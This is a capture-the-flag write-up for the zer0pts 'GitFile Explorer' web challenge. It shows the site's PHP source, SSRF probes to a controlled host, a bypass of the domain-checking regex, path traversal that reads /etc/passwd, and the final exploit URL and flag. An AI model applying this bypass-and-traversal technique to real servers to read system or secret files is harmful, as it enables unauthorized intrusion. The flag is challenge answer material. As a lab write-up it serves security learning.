# GitFile Explorer

The description of the challenge says that *Read /flag.txt on the server.*

Challenge site: http://gitfile.ctf.zer0pts.com:8001/

![image](https://user-images.githubusercontent.com/31372554/159201070-6ff830dd-c0b1-4cf1-b3d2-7a80ef33f80f.png)


It looks like a simple website which allows us to *download files on GitHub/GitLab/BitBucket*

Upon clicking on the Download button, a request to  this url is made https://raw.githubusercontent.com/ptr-yudai/ptrlib/master/README.md and the response of the url is shown in the textarea.

![image](https://user-images.githubusercontent.com/31372554/159201096-4ba15386-1104-47d6-ab77-3a67e98c2b83.png)


We now have  a basic understanding of the website , let see what we can do here to read the `/flag.txt` file.

This url  is in the address bar, when we click on the *Download* button:

http://gitfile.ctf.zer0pts.com:8001/?service=https%3A%2F%2Fraw.githubusercontent.com&owner=ptr-yudai&repo=ptrlib&branch=master&file=README.md

SSRF might be possible here as it is taking an url as an input and giving us back the response of the requested url.
So I changed the `service` parameter value to a domain which I have control over eg: https://en516mcx269todj.m.pipedream.net


-----------------



http://gitfile.ctf.zer0pts.com:8001/?service=https%3A%2F%2Fen516mcx269todj.m.pipedream.net&owner=ptr-yudai&repo=ptrlib&branch=master&file=README.md

Upon visiting the above url, the application threw an error: 

```html
<b>Deprecated</b>:  preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated in <b>/var/www/html/index.php</b> on line <b>29</b><br />

```



The `preg_match` function is used for pattern matching, so there might be a check in place to validate the `service` parameter values either matches to Github/Gitlab/Bitbucket domain or not.

Then I changed the `service` parameter value to raw.githubusercontent.com.attacker.com

http://gitfile.ctf.zer0pts.com:8001/?service=https%3A%2F%2Fraw.githubusercontent.com.attacker.com&owner=ptr-yudai&repo=ptrlib&branch=master&file=README.md

And this time a different error was shown:

```html
<b>Warning</b>:  file_get_contents(): SSL operation failed with code 1. OpenSSL Error messages:
error:1416F086:SSL routines:tls_process_server_certificate:certificate verify failed in <b>/var/www/html/index.php</b> on line <b>30</b><br />
<br />
<b>Warning</b>:  file_get_contents(): Failed to enable crypto in <b>/var/www/html/index.php</b> on line <b>30</b><br />
<br />
<b>Warning</b>:  file_get_contents(https://raw.githubusercontent.com.attacker.com/ptr-yudai/ptrlib/master/README.md): Failed to open stream: operation failed in <b>/var/www/html/index.php</b> on line <b>30</b><br />

```

From this verbose error, it is clear that our input url was successfully passed to `file_get_contents` this time, this tells us that the url validation check is very weak.

-----------------------

**Looking into the source code:**


```php
<?php
function h($s) { return htmlspecialchars($s); }
function craft_url($service, $owner, $repo, $branch, $file) {
    if (strpos($service, "github") !== false) {
        /* GitHub URL */
        return $service."/".$owner."/".$repo."/".$branch."/".$file;

    } else if (strpos($service, "gitlab") !== false) {
        /* GitLab URL */
        return $service."/".$owner."/".$repo."/-/raw/".$branch."/".$file;

    } else if (strpos($service, "bitbucket") !== false) {
        /* BitBucket URL */
        return $service."/".$owner."/".$repo."/raw/".$branch."/".$file;

    }

    return null;
}

$service = empty($_GET['service']) ? "" : $_GET['service'];
$owner   = empty($_GET['owner'])   ? "ptr-yudai" : $_GET['owner'];
$repo    = empty($_GET['repo'])    ? "ptrlib"    : $_GET['repo'];
$branch  = empty($_GET['branch'])  ? "master"    : $_GET['branch'];
$file    = empty($_GET['file'])    ? "README.md" : $_GET['file'];

if ($service) {
    $url = craft_url($service, $owner, $repo, $branch, $file);
    if (preg_match("/^http.+\/\/.*(github|gitlab|bitbucket)/m", $url) === 1) {
        $result = file_get_contents($url);
    }
}
?>
```

http://gitfile.ctf.zer0pts.com:8001/?service=https%3A%2F%2Fraw.githubusercontent.com&owner=ptr-yudai&repo=ptrlib&branch=master&file=README.md

The `craft_url` function creates the final url which will be used later on by combining all the parameter values.It also checks the `service` parameter using `strpos` function, to see if it's contains the word github/gitlab/bitbucket 

Now this why when we put the following host in the `service` parameter raw.githubusercontent.com.attacker.com , it worked.

The returned url from `craft_url` is then stored in variable `$url`, which is again validated using `preg_match` with a regex check.

--------------


```php
php > echo preg_match("/^http.+\/\/.*(github|gitlab|bitbucket)/m", "https://github.com");
1
php > echo preg_match("/^http.+\/\/.*(github|gitlab|bitbucket)/m", "https//github.com");
1
php > echo preg_match("/^http.+\/\/.*(github|gitlab|bitbucket)/m", "https//xyz?github");
1
```

Ok we can easily bypass the check now.
Btw did you noticed the final url `https//xyz?github` , the colon is missing here after the protocol part.

If we try to pass this url to `file_get_contents` function you will get below error:

```php
php > echo file_get_contents('https//xyz?github');
PHP Warning:  file_get_contents(https//xyz?github): failed to open stream: No such file or directory in php shell code on line 1
```


*No such file or directory* ahh nice. So php treats https//xyz?github as a local filen/directory right?



Let's check what happens if we put the missing colon , will we get the same error:

```php
php > echo file_get_contents('https://xyz?github');
PHP Warning:  file_get_contents(): php_network_getaddresses: getaddrinfo failed: No address associated with hostname in php shell code on line 1
PHP Warning:  file_get_contents(https://xyz?github): failed to open stream: php_network_getaddresses: getaddrinfo failed: No address associated with hostname in php shell code on line 1
```

Naaaah! not the same result. This is treated as an url only.




What if we traverse back and try to read `/etc/passwd` ,spolier alert it works :)

```php
php > echo file_get_contents('https//xyz?github/../../../../etc/passwd');
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
```

I saw something similar in a recently shared ctf challenge writeup  (don't remember where but), so I knew what I can read files now.

At first I was trying to solve the challenge like this:
http://gitfile.ctf.zer0pts.com:8001/?service=https//xyz?github/../../../../etc/passwd&owner=ptr-yudai&repo=ptrlib&branch=master&file=README.md

But it didn't worked as the final url was : `https//xyz?github/../../../../etc/passwd/ptr-yudai/ptrlib/master/README.md` , this file/dir didn't existed.

I was focused on the `service` parameter only so I was trying to find a way to ignore rest of the path after `/etc/passwd`.But that didn't work.

```php
file_get_contents('https//xyz?github/../../../../etc/passwd<Somestring>which ignores everything after this')
```

Then after a break, I realized I just need to change the `file` parameter value to something like: `../../../../../flag.txt`

And after playing around a bit, I was able to read the flag:
Final url
http://gitfile.ctf.zer0pts.com:8001/?service=https//../../../%2523github&owner=ptr-yudai&repo=ptrlib&branch=master&file=../../../../../flag.txt


`zer0pts{foo/bar/../../../../../directory/traversal}`
